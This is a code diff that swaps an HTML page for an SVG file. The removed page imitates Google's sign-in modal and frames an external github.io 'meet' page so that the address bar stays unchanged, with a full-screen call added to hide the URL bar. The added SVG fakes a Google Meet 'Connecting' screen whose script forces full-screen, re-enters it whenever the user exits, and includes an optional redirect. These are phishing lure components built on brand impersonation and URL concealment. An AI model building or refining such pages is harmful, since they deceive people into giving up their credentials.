@@ -1,120 +1,54 @@
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google Login Modal Demo</title>
-  <!-- Google Fonts for authentic look (Roboto) -->
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
-  <style>
-    /* Reset for clean look */
-    body {
-      margin: 0;
-      font-family: 'Roboto', sans-serif;
-      background: #f0f0f0; /* Neutral background */
-      overflow: hidden; /* Hide scrollbars to mimic full takeover */
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300" width="400" height="300">
+  <!-- Background and styling -->
+  <rect width="100%" height="100%" fill="#f1f3f4" />
+  
+  <!-- Google Meet-like header -->
+  <text x="20" y="40" font-family="Arial" font-size="18" fill="#202124">Join Meeting</text>
+  
+  <!-- Connecting button with animation -->
+  <g id="connectingGroup" transform="translate(100, 100)">
+    <rect width="200" height="40" rx="4" fill="#4285f4" />
+    <text x="10" y="25" font-family="Arial" font-size="14" fill="white">Connecting</text>
+    <!-- Animated dots -->
+    <circle cx="140" cy="20" r="2" fill="white">
+      <animate attributeName="opacity" values="0;1;0" dur="1.5s" repeatCount="indefinite" />
+    </circle>
+    <circle cx="150" cy="20" r="2" fill="white">
+      <animate attributeName="opacity" values="0;1;0" dur="1.5s" repeatCount="indefinite" begin="0.3s" />
+    </circle>
+    <circle cx="160" cy="20" r="2" fill="white">
+      <animate attributeName="opacity" values="0;1;0" dur="1.5s" repeatCount="indefinite" begin="0.6s" />
+    </circle>
+  </g>
+  
+  <!-- Script for auto full-screen and optional redirect -->
+  <script type="text/javascript"><![CDATA[
+    // Function to request full-screen (triggers after a short delay for "connecting" effect)
+    function goFullScreen() {
+      var elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+      } else if (elem.mozRequestFullScreen) { // Firefox
+        elem.mozRequestFullScreen();
+      } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
+        elem.webkitRequestFullscreen();
+      } else if (elem.msRequestFullscreen) { // IE/Edge
+        elem.msRequestFullscreen();
+      }
     }
-    /* Full-screen overlay (dark semi-transparent) */
-    .overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.6); /* Dark tint for focus */
-      z-index: 9999;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      animation: fadeIn 0.3s ease-in-out; /* Smooth appearance */
-    }
-    /* Modal box styled like Google's login */
-    .modal {
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
-      width: 90%;
-      max-width: 400px;
-      padding: 24px;
-      text-align: center;
-    }
-    /* Google logo (simple SVG for demo) */
-    .google-logo {
-      width: 75px;
-      height: 24px;
-      margin-bottom: 16px;
-    }
-    /* Input fields like Google's */
-    input[type="email"], input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      font-size: 16px;
-      box-sizing: border-box;
-    }
-    /* Google blue button */
-    .google-button {
-      background: #4285f4; /* Google's blue */
-      color: white;
-      border: none;
-      border-radius: 4px;
-      padding: 12px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      width: 100%;
-      margin-top: 16px;
-    }
-    .google-button:hover {
-      background: #357ae8;
-    }
-    /* Footer text like Google's */
-    .footer-text {
-      font-size: 12px;
-      color: #5f6368;
-      margin-top: 16px;
-    }
-    /* Fade-in animation */
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-  </style>
-</head>
 
+    // Auto-trigger full-screen after 2 seconds (simulates connecting, but note: may require user interaction in some browsers)
+    setTimeout(goFullScreen, 2000);
 
-<body>
-  <!-- Static page content with iframe for masked loading -->
-  <div style="text-align: center; padding: 20px;">
-    <h1>Static URL Demo</h1>
-    <p>The URL in the address bar remains static (e.g., your encoded link or this demo page). Click below to load the GitHub content without redirecting.</p>
-    <button onclick="loadStaticContent()" style="padding: 10px 20px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer;">
-      Load GitHub Page Statically
-    </button>
-  </div>
+    // Optional: Auto-redirect after full-screen (uncomment if needed)
+    // setTimeout(function() { window.location.href = 'https://your-redirect-url.com'; }, 4000);
 
-  <!-- Iframe for static loading (initially hidden) -->
-  <iframe id="staticFrame" src="https://em2778708-glitch.github.io/meet/" style="width: 100%; height: 80vh; border: none; display: none;" onload="this.style.display='block';"></iframe>
-
-  <!-- Fallback if iframe fails -->
-  <div id="fallback" style="color: red; font-size: 18px; padding: 20px; display: none;">
-    Content could not be loaded (possibly due to framing restrictions). Edit the HTML to remove redirects or use a proxy.
-  </div>
-
-  <script>
-    function loadStaticContent() {
-      var frame = document.getElementById('staticFrame');
-      frame.onerror = function() {
-        document.getElementById('fallback').style.display = 'block';
-      };
-      // Optional: Go full-screen to hide URL bar
-      if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-    }
-  </script>
-</body>
-
-
-</html>
+    // Attempt to re-enter full-screen if exited
+    document.addEventListener('fullscreenchange', function() {
+      if (!document.fullscreenElement) {
+        goFullScreen();
+      }
+    });
+  ]]></script>
+</svg>
